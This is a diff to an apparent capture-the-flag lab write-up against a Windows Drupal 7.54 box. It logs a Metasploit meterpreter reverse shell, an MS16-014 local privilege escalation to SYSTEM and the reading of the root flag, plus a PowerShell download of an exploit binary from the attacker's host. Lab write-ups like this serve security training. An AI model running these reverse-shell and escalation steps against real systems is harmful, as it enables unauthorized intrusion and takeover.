@@ -613,3 +613,156 @@ C:\inetpub\drupal-7.54>
 ```
 PROCESSOR_ARCHITECTURE=AMD64
 Still in 32bit shell ????
+
+C:\inetpub\drupal-7.54>.\msf_shell.exe
+.\msf_shell.exe
+
+=>> Open a handler..
+```
+ msfconsole
+                  
+msf > use exploit/multi/handler
+msf exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
+payload => windows/x64/meterpreter/reverse_tcp
+msf exploit(multi/handler) > set LHOST 10.10.14.32
+LHOST => 10.10.14.32
+msf exploit(multi/handler) > set LPORT 4445
+LPORT => 4445
+msf exploit(multi/handler) > run
+
+[*] Started reverse TCP handler on 10.10.14.32:4445 
+[*] Sending stage (206403 bytes) to 10.10.10.9
+[*] Meterpreter session 1 opened (10.10.14.32:4445 -> 10.10.10.9:49475) at 2019-09-07 17:07:27 +0200
+
+meterpreter > getuid
+Server username: NT AUTHORITY\IUSR
+
+
+> use exploit/windows/local/ms16_014_wmi_recv_notif
+msf exploit(windows/local/ms16_014_wmi_recv_notif) > set payload windows/x64/shell/reverse_tcp
+payload => windows/x64/shell/reverse_tcp
+msf exploit(windows/local/ms16_014_wmi_recv_notif) > show options
+
+Module options (exploit/windows/local/ms16_014_wmi_recv_notif):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   SESSION                   yes       The session to run this module on.
+
+
+Payload options (windows/x64/shell/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST                      yes       The listen address (an interface may be specified)
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Windows 7 SP0/SP1
+
+
+msf exploit(windows/local/ms16_014_wmi_recv_notif) > set LHOST 10.10.14.32
+LHOST => 10.10.14.32
+msf exploit(windows/local/ms16_014_wmi_recv_notif) > set session 1
+session => 1
+msf exploit(windows/local/ms16_014_wmi_recv_notif) > show options
+
+Module options (exploit/windows/local/ms16_014_wmi_recv_notif):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   SESSION  1                yes       The session to run this module on.
+
+
+Payload options (windows/x64/shell/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST     10.10.14.32      yes       The listen address (an interface may be specified)
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Windows 7 SP0/SP1
+
+
+msf exploit(windows/local/ms16_014_wmi_recv_notif) > show targets
+
+Exploit targets:
+
+   Id  Name
+   --  ----
+   0   Windows 7 SP0/SP1
+
+
+msf exploit(windows/local/ms16_014_wmi_recv_notif) > run
+
+[*] Started reverse TCP handler on 10.10.14.32:4444 
+[*] Launching notepad to host the exploit...
+[+] Process 2716 launched.
+[*] Reflectively injecting the exploit DLL into 2716...
+[*] Injecting exploit into 2716...
+[*] Exploit injected. Injecting payload into 2716...
+[*] Payload injected. Executing exploit...
+[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
+[*] Sending stage (336 bytes) to 10.10.10.9
+[*] Command shell session 2 opened (10.10.14.32:4444 -> 10.10.10.9:49476) at 2019-09-07 17:11:48 +0200
+
+Microsoft Windows [Version 6.1.7600]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+C:\inetpub\drupal-7.54>whoami
+whoami
+nt authority\system
+
+C:\inetpub\drupal-7.54>dir \users\Administrator\Desktop
+dir \users\Administrator\Desktop
+ Volume in drive C has no label.
+ Volume Serial Number is 605B-4AAA
+
+ Directory of C:\users\Administrator\Desktop
+
+19/03/2017  08:33 ��    <DIR>          .
+19/03/2017  08:33 ��    <DIR>          ..
+19/03/2017  08:34 ��                32 root.txt.txt
+               1 File(s)             32 bytes
+               2 Dir(s)  30.803.386.368 bytes free
+
+C:\inetpub\drupal-7.54>type C:\users\Administrator\Desktop\root.txt.txt
+type C:\users\Administrator\Desktop\root.txt.txt
+XXXXX
+```
+
+
+Scripts path : /usr/share/metasploit-framework/modules/exploits/
+
+cp /usr/share/metasploit-framework/modules/exploits/windows/local/ms16_014_wmi_recv_notif.rb .
+
+## Test local exploit : ko
+
+```
+# wget https://github.com/SecWiki/windows-kernel-exploits/raw/master/MS16-014/ms16-014.rar
+
+# unrar x ms16-014.rar
+
+# ms16-014/x64/Release# cp ms16-014.exe ../../..
+(new-object System.Net.WebClient).DownloadFile('http://10.10.14.32:8000/ms16-014.exe', 'ms16-014.exe') 
+
+
+.\ms16-014.exe whoami   : ms16-014/x64/Release/ms16-014.exe  freeze
+.\ms16-014.exe whoami   : ms16-014/Release/ms16-014.exe  
+MS16-014 exploit by skyer
+HalDispatchTable is at: 0x17883b0
+What is at: 0x1533a0
+Where is at: 0x152308
+Spraying stack...
+Exploit fail
